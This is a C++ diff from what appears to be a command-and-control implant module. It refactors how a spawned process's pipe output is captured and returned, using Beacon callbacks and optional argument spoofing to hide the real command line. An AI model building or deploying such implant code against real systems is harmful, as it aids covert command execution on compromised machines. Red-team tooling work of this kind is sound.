@@ -8,11 +8,172 @@
 #define MIN(a, b) (((a) < (b)) ? (a) : (b))
 #endif
 
-auto kh_process_creation( 
-    _In_  PS_CREATE_ARGS*      create_args,
-    _Out_ PROCESS_INFORMATION* ps_information
+auto read_pipe_output(
+    _In_      HANDLE  pipe_read,
+    _In_      HANDLE  process_handle,
+    _Out_opt_ PBYTE*  out_buffer,
+    _Out_opt_ ULONG*  out_length
 ) -> NTSTATUS {
-    DbgPrint("a\n");
+    DbgPrint( "[read_pipe_output] Starting pipe read loop\n" );
+
+    // Inicializar outputs
+    if ( out_buffer ) *out_buffer = nullptr;
+    if ( out_length ) *out_length = 0;
+
+    DWORD  total_elapsed   = 0;
+    DWORD  bytes_available = 0;
+    DWORD  bytes_read      = 0;
+    BYTE   read_buffer[4096];
+    BOOL   process_exited  = FALSE;
+
+    SIZE_T output_capacity = 0x10000;
+    SIZE_T output_size     = 0;
+    PBYTE  output_buffer   = (PBYTE)malloc( output_capacity );
+
+    if ( !output_buffer ) {
+        DbgPrint( "[read_pipe_output] ERROR: Failed to allocate output buffer\n" );
+        BeaconPrintf( CALLBACK_ERROR, "Failed to allocate output buffer" );
+        return STATUS_NO_MEMORY;
+    }
+
+    DbgPrint( "[read_pipe_output] Output buffer allocated: %p (capacity: %zu)\n", output_buffer, output_capacity );
+
+    while ( total_elapsed < PIPE_READ_TIMEOUT_MS ) {
+        // Verificar se o processo terminou
+        DWORD wait_result = WaitForSingleObject( process_handle, 0 );
+        if ( wait_result == WAIT_OBJECT_0 ) {
+            if ( !process_exited ) {
+                DbgPrint( "[read_pipe_output] Process exited\n" );
+            }
+            process_exited = TRUE;
+        }
+
+        // Verificar dados disponíveis
+        bytes_available = 0;
+        BOOL peek_result = PeekNamedPipe( pipe_read, nullptr, 0, nullptr, &bytes_available, nullptr );
+
+        if ( !peek_result ) {
+            DWORD peek_error = GetLastError();
+            DbgPrint( "[read_pipe_output] PeekNamedPipe failed: %d\n", peek_error );
+
+            if ( peek_error == ERROR_BROKEN_PIPE ) {
+                DbgPrint( "[read_pipe_output] Pipe broken - exiting loop\n" );
+                break;
+            }
+        }
+
+        DbgPrint( "[read_pipe_output] bytes_available: %d, process_exited: %d, elapsed: %d\n",
+            bytes_available, process_exited, total_elapsed );
+
+        if ( bytes_available > 0 ) {
+            DbgPrint( "[read_pipe_output] Reading %d bytes...\n", bytes_available );
+
+            while ( bytes_available > 0 ) {
+                DWORD to_read = MIN( bytes_available, (DWORD)sizeof(read_buffer) );
+                bytes_read = 0;
+
+                if ( !ReadFile( pipe_read, read_buffer, to_read, &bytes_read, nullptr ) ) {
+                    DbgPrint( "[read_pipe_output] ReadFile failed: %d\n", GetLastError() );
+                    break;
+                }
+
+                if ( bytes_read == 0 ) {
+                    DbgPrint( "[read_pipe_output] ReadFile returned 0 bytes\n" );
+                    break;
+                }
+
+                DbgPrint( "[read_pipe_output] Read %d bytes\n", bytes_read );
+
+                // Expandir buffer se necessário
+                while ( output_size + bytes_read > output_capacity ) {
+                    SIZE_T new_capacity = output_capacity * 2;
+                    DbgPrint( "[read_pipe_output] Growing buffer: %zu -> %zu\n", output_capacity, new_capacity );
+
+                    PBYTE new_buffer = (PBYTE)realloc( output_buffer, new_capacity );
+
+                    if ( !new_buffer ) {
+                        DbgPrint( "[read_pipe_output] ERROR: realloc failed\n" );
+                        // Retornar o que temos até agora
+                        if ( out_buffer && out_length ) {
+                            *out_buffer = output_buffer;
+                            *out_length = (ULONG)output_size;
+                        } else {
+                            free( output_buffer );
+                        }
+                        return STATUS_NO_MEMORY;
+                    }
+
+                    output_buffer   = new_buffer;
+                    output_capacity = new_capacity;
+                }
+
+                memcpy( output_buffer + output_size, read_buffer, bytes_read );
+                output_size += bytes_read;
+                DbgPrint( "[read_pipe_output] Buffer now has %zu bytes\n", output_size );
+
+                bytes_available -= bytes_read;
+            }
+
+            total_elapsed = 0;
+        } else {
+            if ( process_exited ) {
+                DbgPrint( "[read_pipe_output] Process exited, checking for final data...\n" );
+                WaitForSingleObject( nt_current_process(), 50 );
+
+                if ( PeekNamedPipe( pipe_read, nullptr, 0, nullptr, &bytes_available, nullptr ) && bytes_available == 0 ) {
+                    DbgPrint( "[read_pipe_output] No more data - done\n" );
+                    break;
+                }
+            } else {
+                WaitForSingleObject( nt_current_process(), PIPE_POLL_INTERVAL_MS );
+                total_elapsed += PIPE_POLL_INTERVAL_MS;
+            }
+        }
+    }
+
+    DbgPrint( "[read_pipe_output] Loop ended - output_size: %zu\n", output_size );
+
+    // Retornar o buffer e tamanho
+    if ( output_size > 0 ) {
+        // Adicionar null terminator
+        if ( output_size >= output_capacity ) {
+            PBYTE new_buffer = (PBYTE)realloc( output_buffer, output_size + 1 );
+            if ( new_buffer ) {
+                output_buffer = new_buffer;
+            }
+        }
+        output_buffer[output_size] = '\0';
+
+        // Transferir ownership para o caller
+        if ( out_buffer && out_length ) {
+            *out_buffer = output_buffer;
+            *out_length = (ULONG)output_size;
+            DbgPrint( "[read_pipe_output] Output transferred: %p, %lu bytes\n", *out_buffer, *out_length );
+        } else {
+            free( output_buffer );
+            DbgPrint( "[read_pipe_output] Output discarded (caller doesn't want it)\n" );
+        }
+    } else {
+        free( output_buffer );
+        DbgPrint( "[read_pipe_output] No output captured\n" );
+    }
+
+    return STATUS_SUCCESS;
+}
+
+// ============================================================================
+// Função principal
+// ============================================================================
+
+extern "C" auto kh_process_creation( 
+    _In_      PS_CREATE_ARGS*      create_args,
+    _Out_opt_ PROCESS_INFORMATION* ps_information,
+    _Out_opt_ PBYTE*               output_ptr,
+    _Out_opt_ ULONG*               output_len
+) -> NTSTATUS {
+    // Inicializar outputs
+    if ( output_ptr ) *output_ptr = nullptr;
+    if ( output_len ) *output_len = 0;
 
     auto process_cmdline = (*create_args->spoofarg ? create_args->spoofarg : create_args->argument);
     auto process_info    = PROCESS_INFORMATION{ 0 };
@@ -226,149 +387,37 @@ auto kh_process_creation(
         return cleanup( GetLastError() );
     }
 
-    DbgPrint( "[kh_process_creation] Process created - PID: %d, TID: %d, hProcess: %p, hThread: %p\n", 
-        process_info.dwProcessId, process_info.dwThreadId, process_info.hProcess, process_info.hThread );
+    DbgPrint( "[kh_process_creation] Process created - PID: %d, TID: %d\n", process_info.dwProcessId, process_info.dwThreadId );
 
-    BeaconPrintf( CALLBACK_OUTPUT, "Process created - PID: %d | TID: %d\n", process_info.dwProcessId, process_info.dwThreadId );
-
+    // Fechar pipe_write antes de ler
     if ( pipe_write ) {
         CloseHandle( pipe_write );
         pipe_write = nullptr;
         DbgPrint( "[kh_process_creation] Closed pipe_write before reading\n" );
     }
 
-    // =========================================================================
-    // Read pipe output
-    // =========================================================================
+    // Ler output do pipe
     if ( create_args->pipe && pipe_read ) {
-        DbgPrint( "[pipe_read] Starting pipe read loop\n" );
+        PBYTE  pipe_output = nullptr;
+        ULONG  pipe_length = 0;
 
-        DWORD  total_elapsed   = 0;
-        DWORD  bytes_available = 0;
-        DWORD  bytes_read      = 0;
-        BYTE   read_buffer[4096];
-        BOOL   process_exited  = FALSE;
+        DbgPrint("a\n");
 
-        SIZE_T output_capacity = 0x10000;
-        SIZE_T output_size     = 0;
-        PBYTE  output_buffer   = (PBYTE)malloc( output_capacity );
+        NTSTATUS read_status = read_pipe_output( pipe_read, process_info.hProcess, &pipe_output, &pipe_length );
 
-        if ( !output_buffer ) {
-            DbgPrint( "[pipe_read] ERROR: Failed to allocate output buffer\n" );
-            BeaconPrintf( CALLBACK_ERROR, "Failed to allocate output buffer" );
-        } else {
-            DbgPrint( "[pipe_read] Output buffer allocated: %p (capacity: %zu)\n", output_buffer, output_capacity );
-
-            while ( total_elapsed < PIPE_READ_TIMEOUT_MS ) {
-                DWORD wait_result = WaitForSingleObject( process_info.hProcess, 0 );
-                if ( wait_result == WAIT_OBJECT_0 ) {
-                    if ( !process_exited ) {
-                        DbgPrint( "[pipe_read] Process exited\n" );
-                    }
-                    process_exited = TRUE;
-                }
-
-                bytes_available = 0;
-                BOOL peek_result = PeekNamedPipe( pipe_read, nullptr, 0, nullptr, &bytes_available, nullptr );
-                
-                if ( !peek_result ) {
-                    DWORD peek_error = GetLastError();
-                    DbgPrint( "[pipe_read] PeekNamedPipe failed: %d\n", peek_error );
-                    
-                    if ( peek_error == ERROR_BROKEN_PIPE ) {
-                        DbgPrint( "[pipe_read] Pipe broken - exiting loop\n" );
-                        break;
-                    }
-                }
-
-                DbgPrint( "[pipe_read] bytes_available: %d, process_exited: %d, elapsed: %d\n", 
-                    bytes_available, process_exited, total_elapsed );
-
-                if ( bytes_available > 0 ) {
-                    DbgPrint( "[pipe_read] Reading %d bytes...\n", bytes_available );
-
-                    while ( bytes_available > 0 ) {
-                        DWORD to_read = MIN( bytes_available, (DWORD)sizeof(read_buffer) );
-                        bytes_read = 0;
-
-                        if ( !ReadFile( pipe_read, read_buffer, to_read, &bytes_read, nullptr ) ) {
-                            DbgPrint( "[pipe_read] ReadFile failed: %d\n", GetLastError() );
-                            break;
-                        }
-
-                        if ( bytes_read == 0 ) {
-                            DbgPrint( "[pipe_read] ReadFile returned 0 bytes\n" );
-                            break;
-                        }
-
-                        DbgPrint( "[pipe_read] Read %d bytes\n", bytes_read );
-
-                        // Grow buffer if needed
-                        while ( output_size + bytes_read > output_capacity ) {
-                            SIZE_T new_capacity = output_capacity * 2;
-                            DbgPrint( "[pipe_read] Growing buffer: %zu -> %zu\n", output_capacity, new_capacity );
-                            
-                            PBYTE new_buffer = (PBYTE)realloc( output_buffer, new_capacity );
-                            
-                            if ( !new_buffer ) {
-                                DbgPrint( "[pipe_read] ERROR: realloc failed - flushing buffer\n" );
-                                if ( output_size > 0 ) {
-                                    BeaconPrintf( CALLBACK_OUTPUT, "%.*s", (int)output_size, output_buffer );
-                                    output_size = 0;
-                                }
-                                break;
-                            }
-                            
-                            output_buffer   = new_buffer;
-                            output_capacity = new_capacity;
-                        }
-
-                        if ( output_size + bytes_read <= output_capacity ) {
-                            memcpy( output_buffer + output_size, read_buffer, bytes_read );
-                            output_size += bytes_read;
-                            DbgPrint( "[pipe_read] Buffer now has %zu bytes\n", output_size );
-                        }
-
-                        bytes_available -= bytes_read;
-                    }
-
-                    total_elapsed = 0;
-                } else {
-                    if ( process_exited ) {
-                        DbgPrint( "[pipe_read] Process exited, checking for final data...\n" );
-                        WaitForSingleObject( nt_current_process(), 50 );
-                        
-                        if ( PeekNamedPipe( pipe_read, nullptr, 0, nullptr, &bytes_available, nullptr ) && bytes_available == 0 ) {
-                            DbgPrint( "[pipe_read] No more data - done\n" );
-                            break;
-                        }
-                    } else {
-                        WaitForSingleObject( nt_current_process(), PIPE_POLL_INTERVAL_MS );
-                        total_elapsed += PIPE_POLL_INTERVAL_MS;
-                    }
-                }
-            }
-
-            DbgPrint( "[pipe_read] Loop ended - output_size: %zu\n", output_size );
-
-            if ( output_size > 0 ) {
-                DbgPrint( "[pipe_read] Sending output to beacon\n" );
-                
-                if ( output_size < output_capacity ) {
-                    output_buffer[output_size] = '\0';
-                    BeaconPrintf( CALLBACK_OUTPUT, "%s", output_buffer );
-                } else {
-                    BeaconPrintf( CALLBACK_OUTPUT, "%.*s", (int)output_size, output_buffer );
-                }
+        if ( nt_success(read_status) && pipe_output && pipe_length > 0 ) {
+            if ( output_ptr && output_len ) {
+                *output_ptr = pipe_output;
+                *output_len = pipe_length;
+                DbgPrint( "[kh_process_creation] Output transferred to caller: %lu bytes\n", pipe_length );
             } else {
-                DbgPrint( "[pipe_read] No output captured\n" );
+                free( pipe_output );
+                DbgPrint( "[kh_process_creation] Output discarded (caller doesn't want it)\n" );
             }
-
-            free( output_buffer );
-            DbgPrint( "[pipe_read] Output buffer freed\n" );
         }
     }
 
+    // Retornar informações do processo
     if ( ps_information ) {
         *ps_information = process_info;
         DbgPrint( "[kh_process_creation] Returning process info to caller\n" );
